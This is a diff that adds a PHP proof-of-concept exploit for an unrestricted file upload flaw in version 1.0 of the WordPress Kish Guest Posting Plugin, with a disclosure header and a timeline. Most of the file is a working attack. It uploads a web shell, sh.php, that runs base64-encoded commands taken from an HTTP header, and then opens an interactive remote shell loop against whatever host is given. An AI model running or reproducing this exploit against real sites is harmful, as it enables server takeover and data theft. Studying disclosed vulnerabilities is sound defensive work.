@@ -1,0 +1,106 @@
+<?php
+
+/*
+    --------------------------------------------------------------------------------
+    Wordpress Kish Guest Posting Plugin 1.0 (uploadify.php) Unrestricted File Upload
+    --------------------------------------------------------------------------------
+    
+    author............: Egidio Romano aka EgiX
+    mail..............: n0b0d13s[at]gmail[dot]com
+    software link.....: http://kishpress.com/guest-posting-plugin/
+     
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] vulnerable code in /uploadify/scripts/uploadify.php
+    
+    26.    if (!empty($_FILES)) {
+    27.        $tempFile = $_FILES['Filedata']['tmp_name'];
+    28.        $targetPath = $_SERVER['DOCUMENT_ROOT'] . $_REQUEST['folder'] . '/';
+    29.        $targetFile =  str_replace('//','/',$targetPath) . $_FILES['Filedata']['name'];
+    30.        // $fileTypes  = str_replace('*.','',$_REQUEST['fileext']);
+    31.        // $fileTypes  = str_replace(';','|',$fileTypes);
+    32.        // $typesArray = split('\|',$fileTypes);
+    33.        // $fileParts  = pathinfo($_FILES['Filedata']['name']);
+    34.        
+    35.        // if (in_array($fileParts['extension'],$typesArray)) {
+    36.            // Uncomment the following line if you want to make the directory if it doesn't exist
+    37.            // mkdir(str_replace('//','/',$targetPath), 0755, true);
+    38.            
+    39.            move_uploaded_file($tempFile,$targetFile);
+    40.            echo str_replace($_SERVER['DOCUMENT_ROOT'],'',$targetFile);
+    41.        // } else {
+    42.        //     echo 'Invalid file type.';
+    43.        // }
+    44.    }
+    
+    Restricted access to  this script isn't properly realized,  so an attacker might  be able to upload
+    arbitrary files containing malicious PHP code due to uploaded file extension isn't properly checked.
+    
+    [-] Disclosure timeline:
+    
+    [19/12/2011] - Vulnerability discovered
+    [19/12/2011] - Vendor notified through http://kish.in/contact-me/
+    [07/01/2012] - No response from vendor, notified again via email
+    [16/01/2012] - After four weeks still no response
+    [23/01/2012] - Public disclosure
+    
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die("\n[-] No response from {$host}:80\n");
+ 
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+----------------------------------------------------------------------------------+";
+print "\n| Wordpress Kish Guest Posting Plugin 1.0 Unrestricted File Upload Exploit by EgiX |";
+print "\n+----------------------------------------------------------------------------------+\n";
+ 
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /wordpress/\n";
+    die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$payload  = "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"sh.php\"\r\n\r\n";
+$payload .= "<?php error_reporting(0); print(___); passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n";
+$payload .= "--o0oOo0o--\r\n";
+
+$packet  = "POST {$path}wp-content/plugins/kish-guest-posting/uploadify/scripts/uploadify.php?folder={$path} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+    
+if (!preg_match('/sh.php/', http_send($host, $packet))) die("\n[-] Upload failed!\n");
+
+$packet  = "GET {$path}sh.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+    
+while(1)
+{
+    print "\nkish-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
+
+?>
